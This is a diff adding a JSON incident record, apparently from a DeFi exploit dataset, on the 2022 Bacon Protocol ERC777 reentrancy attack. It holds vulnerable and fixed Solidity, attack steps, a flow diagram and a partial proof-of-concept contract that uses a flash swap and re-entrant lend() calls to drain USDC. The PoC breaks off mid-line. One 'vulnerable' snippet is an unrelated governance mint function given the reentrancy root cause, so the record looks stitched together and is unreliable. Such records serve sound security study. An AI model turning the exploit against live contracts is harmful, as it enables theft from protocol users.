@@ -1,0 +1,37 @@
+{
+ "id": "2022__2022-03-06_BaconProtocol_Reentrancy",
+ "source_file": "2022/2022-03-06_BaconProtocol_Reentrancy.md",
+ "title": "Bacon Protocol — ERC777 Reentrancy Attack Analysis",
+ "date": "2022-03-06",
+ "protocol": "Bacon Protocol",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$1,000,000 USDC",
+ "loss_usd": 1000000.0,
+ "root_cause": "`tokensReceived` hook reentrancy via ERC1820 interface registration — callback triggered before state update during `lend()`",
+ "attack_tx": "Block 14326931",
+ "vulnerable_contract": "0xb8919522...",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "❌ Vulnerable: lend() updates state after bToken transfer — reentrancy possible\nfunction lend(uint256 usdcAmount) external {\n    // Receive USDC and mint bTokens\n    usdc.transferFrom(msg.sender, address(this), usdcAmount);\n\n    // bToken transfer triggers ERC777 tokensReceived hook!\n    bToken.transfer(msg.sender, bTokenAmount);\n    // ↑ Attacker's tokensReceived is called here\n    // State has not yet been updated at this point\n\n    //",
+  "❌ State update occurs after external call\n    totalLent += usdcAmount;\n}\n\n//",
+  "// ❌ Root cause: tokensReceived hook reentrancy via ERC1820 interface registration — callback triggered before state update during lend()\n    function mint(address account, uint256 amount) public {  // ❌ Unauthorized minting\n        require(msg.sender == stakingContract || msg.sender == airdropContract, \"Invalid mint sender\");\n        super._mint(account, amount);\n        _moveDelegates(address(0), delegates[account], amount);\n    }"
+ ],
+ "code_after": [
+  "✅ Fixed: CEI pattern + nonReentrant\nfunction lend(uint256 usdcAmount) external nonReentrant {\n    // 1. Update state first\n    totalLent += usdcAmount;\n    uint256 bTokenAmount = calculateBTokens(usdcAmount);\n\n    // 2. External calls after\n    usdc.transferFrom(msg.sender, address(this), usdcAmount);\n    bToken.transfer(msg.sender, bTokenAmount);\n}"
+ ],
+ "steps": [
+  "1 ► Register tokensReceived hook with ERC1820",
+  "2 ► Uniswap flash swap: borrow 6.36M USDC",
+  "3 ► bacon.lend(2.12M USDC) [count=0]",
+  "► bToken transfer → tokensReceived callback!",
+  "4 ► bacon.redeem(bToken_balance)",
+  "→ Receives 3x+ USDC back!",
+  "5 ► Repay flash swap + realize profit"
+ ],
+ "other_code": [
+  "Attacker\n │\n ├─1─► Register tokensReceived hook with ERC1820\n │\n ├─2─► Uniswap flash swap: borrow 6.36M USDC\n │\n ├─3─► bacon.lend(2.12M USDC)  [count=0]\n │       │\n │       ├─► USDC transfer complete\n │       ├─► bToken transfer → tokensReceived callback!\n │       │         │\n │       │         └─► [Reentrance 1] bacon.lend(2.12M USDC) [count=1]\n │       │                   │\n │       │                   └─► [Reentrance 2] bacon.lend(2.12M USDC) [count=2]\n │       │\n │       └─► State update (lend already executed 3 times)\n │\n ├─4─► bacon.redeem(bToken_balance)\n │       → Receives 3x+ USDC back!\n │\n └─5─► Repay flash swap + realize profit",
+  "contract ContractTest is Test {\n    uint256 count = 0;\n\n    constructor() {\n        // Register as tokensReceived hook implementer with ERC1820 registry\n        ERC1820Registry(0x1820a4B7...).setInterfaceImplementer(\n            address(this),\n            bytes32(0xb281fc8c...),  // IERC777TokensRecipient interface ID\n            address(this)\n        );\n    }\n\n    // Uniswap flash swap callback\n    function uniswapV2Call(address, uint256 amount0, ...) public {\n        usdc.approve(address(bacon), 10_000_000_000_000_000_000);\n        bacon.lend(2_120_000_000_000);  // First lend\n        bacon.redeem(bacon.balanceOf(address(this)));  // Drain USDC with inflated bTokens\n        usdc.transfer(msg.sender, repayAmount);        // Repay flash swap\n        usdc.transfer(tx.origin, usdc.balanceOf("
+ ]
+}
